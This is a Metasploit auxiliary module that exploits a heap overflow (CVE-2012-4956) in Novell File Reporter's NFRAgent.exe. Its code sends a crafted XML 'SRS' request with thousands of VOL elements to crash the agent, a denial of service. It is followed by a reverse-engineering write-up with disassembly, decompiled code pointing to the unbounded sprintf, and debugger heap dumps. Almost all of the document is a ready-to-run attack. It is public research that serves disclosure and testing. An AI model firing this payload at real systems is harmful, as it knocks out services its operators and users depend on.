##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NFR Agent Heap Overflow Vulnerability',
      'Description'    => %q{
          This module exploits a heap overflow in NFRAgent.exe, a component of Novell
        File Reporter (NFR). The vulnerability occurs when handling requests of name "SRS",
        where NFRAgent.exe fails to generate a response in a secure way, copying user
        controlled data into a fixed-length buffer in the heap without bounds checking.
        This module has been tested against NFR Agent 1.0.4.3 (File Reporter 1.0.2).
      },
      'Author'         => [ 'juan vazquez' ],
      'License'        => MSF_LICENSE,
      'References'     => [
        [ 'CVE', '2012-4956' ],
        [ 'URL', 'https://blog.rapid7.com/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
      ],
      'DisclosureDate' => 'Nov 16 2012'))

    register_options(
      [
        Opt::RPORT(3037),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])

  end

  def run
    record = "<RECORD>"
    record << "<NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>7</CMD>" # Operation
    record << "<VOL>#{Rex::Text.rand_text_alpha(10)}</VOL>" * 0xc35 # Volumes
    record << "</RECORD>"

    md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
    message = md5 + record

    print_status("Triggering a heap overflow to cause DoS...")

    begin
    res = send_request_cgi(
      {
        'uri'     => '/FSF/CMD',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "text/xml",
        'data'    => message
      })
    rescue ::Errno::ECONNRESET
      print_good("NFR Agent didn't answer, DoS seems successful")
      return
    end

    if res
      print_error("NFR Agent didn't die, it still answers...")
      return
    end

    print_good("NFR Agent didn't answer, DoS seems successful")
  end
end

=begin

* Static analysis

1) Handling of "SRS" records happens in handle_SRS_sub_4048D0:

.text:00404BE9                 add     esp, 0Ch
.text:00404BEC                 push    14h             ; length_arg_C
.text:00404BEE                 lea     eax, [ebp+record_name_var_28]
.text:00404BF1                 push    eax             ; result_arg_8
.text:00404BF2                 push    offset aName    ; "NAME"
.text:00404BF7                 mov     ecx, [ebp+message_arg_8]
.text:00404BFA                 add     ecx, 20h
.text:00404BFD                 push    ecx             ; xml_message_arg_0
.text:00404BFE                 mov     ecx, [ebp+var_2C]
.text:00404C01                 call    parse_tag_sub_40A760 ; search tag "NAME" in the xml_message_arg_0 and store contents int he "record_name_var_28" variable
.text:00404C06                 movzx   edx, al
.text:00404C09                 test    edx, edx
.text:00404C0B                 jz      short loc_404C8B
.text:00404C0D                 push    offset aSrs_2   ; "SRS"
.text:00404C12                 lea     eax, [ebp+record_name_var_28]
.text:00404C15                 push    eax             ; char *
.text:00404C16                 call    _strcmp         ; compares the contents of the "NAME"  element in the xml message from the request with the "SRS" string.
.text:00404C1B                 add     esp, 8
.text:00404C1E                 test    eax, eax
.text:00404C20                 jnz     short loc_404C38 ; if not "SRS" name check others, if yes, handle it...
.text:00404C22                 mov     ecx, [ebp+message_arg_8]
.text:00404C25                 push    ecx             ; void *
.text:00404C26                 mov     edx, [ebp+arg_4]
.text:00404C29                 push    edx             ; int
.text:00404C2A                 mov     eax, [ebp+arg_0]
.text:00404C2D                 push    eax             ; int
.text:00404C2E                 call    handle_SRS_sub_4048D0 ; handle the XML message with the RECORD of NAME "SRS"

2) In this function memory is allocated to store the response which will be build:

.text:00404903                 push    0C350h          ; size_t
.text:00404908                 call    _malloc
.text:0040490D                 add     esp, 4
.text:00404910                 mov     [ebp+response_var_8], eax

0:007> g
Breakpoint 0 hit
eax=009e68b8 ebx=003f3bf8 ecx=b85645ca edx=7c90e4f4 esi=003f3bf8 edi=00000000
eip=00404908 esp=0120ff4c ebp=0120ff58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
NFRAgent+0x4908:
00404908 e84cef0300      call    NFRAgent+0x43859 (00443859)
0:007> dd esp L1
0120ff4c  0000c350
0:007> p
eax=01220110 ebx=003f5e20 ecx=7c9101bb edx=009e0608 esi=003f5e20 edi=00000000
eip=0040490d esp=0120ff4c ebp=0120ff58 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
NFRAgent+0x490d:
0040490d 83c404          add     esp,4
0:007> !heap -p -a eax
    address 01220110 found in
_HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]   01220110    0c350 - (busy)

3) The SRS record used in this module is handled by:

.text:004082E0 ; int __stdcall SRS_7_4_sub_4082E0(char *xml_message_arg_0, char
*result_response_arg_4)

4) The handling function allow to overflow the heap buffer when a big number of VOL elements are processed:

    for ( vol_object_var_254 = v25; vol_object_var_254; vol_object_var_254 = *(_DWORD
*)(vol_object_var_254 + 12) )
    {
      parse_tag_sub_40A760((void *)v15, *(const char **)vol_object_var_254, (int)"VOL",
&vol_name_var_20c, 0x1F4u); // get VOL element
      volume_fspace_vol_35C = handle_volume_sub_4081E0(&vol_name_var_20c); // Retrieve Volume
Free Space
      volume_fscape_var_358 = v2;
vol_name_html_encode_var_494 = html_encode_sub_40B490(&vol_name_var_20c); // HTML Encode
the volume name (user controlled data)
      if ( vol_name_html_encode_var_494 )
{ // If the volume name has been HTML Encoded
        v3 = volume_fscape_var_358;
v4 = volume_fspace_vol_35C;
v5 = vol_name_html_encode_var_494;
v6 = strlen(result_response_arg_4);
sprintf(&result_response_arg_4[v6], "<VOL><NAME>%s</NAME><FSPACE>%I64d</FSPACE></VOL>",
v5, v4, v3); // Vulnerability!!! sprintf user controlled data (volume name) to the end of the
fix-length buffer in the heap without bound checking
        free(vol_name_html_encode_var_494);
        vol_name_html_encode_var_494 = 0;
      }
else
{ // If the volume name hasn’t been HTML Encoded
        v7 = volume_fscape_var_358;
v8 = volume_fspace_vol_35C;
v9 = strlen(result_response_arg_4);
sprintf(
          &result_response_arg_4[v9], // Vulnerability!!! sprintf user controlled data (volume
name) to the end of the fix-length buffer in the heap without bound checking
          "<VOL><NAME>%s</NAME><FSPACE>%I64d</FSPACE></VOL>",
&vol_name_var_20c,
v8,
v7);
      }
    }

The results for every volume (VOL element) are attached to the fixed-length heap buffer via the sprintf at 004085C5:

Breakpoint 1 hit
eax=0122013e ebx=003f5e20 ecx=01220110 edx=c7ff3d52 esi=00479f89 edi=0120f1a1
eip=004085c5 esp=0120eec8 ebp=0120f3c0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
NFRAgent+0x85c5:
004085c5 e84ea70300      call    NFRAgent+0x42d18 (00442d18)
0:007> dd esp L1
0120eec8  0122013e
0:007> !heap -p -a 0122013e
    address 0122013e found in
_HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]   01220110    0c350 - (busy)
0:007> da poi(esp+4)
0047a040  "<VOL><NAME>%s</NAME><FSPACE>%I64"
0047a060  "d</FSPACE></VOL>"
0:007> da poi(esp+8)
01250208  "AAAAAAAAAA"

After the loop handling VOL overflows the heap buffer and both heap chunk metadata and contents are
overwritten for the chunk just after the vulnerable one:

0:007> g
Breakpoint 0 hit
eax=00000000 ebx=003f5e20 ecx=00443085 edx=012501b0 esi=00479f89 edi=0120f1a1
eip=00408645 esp=0120eedc ebp=0120f3c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
NFRAgent+0x8645:
00408645 c7852cfbffff00000000 mov dword ptr [ebp-4D4h],0 ss:0023:0120eeec=03ee2001
0:007> !heap -p -a 01220110
    address 01220110 found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]   01220110    0c350 - (busy)
0:007> !heap -p -a 01220110+0xc350
    address 0122c460 found in
_HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0122c460 3e45 0000  [46]   0122c468    1f220 - (free)
0:007> db 0122c460 L8
0122c460  45 3e 30 3c 2f 46 53 50                          E>0</FSP
0:007> db 0122c468 L10
0122c468  41 43 45 3e 3c 2f 56 4f-4c 3e 3c 56 4f 4c 3e 3c  ACE></VOL><VOL><
=end
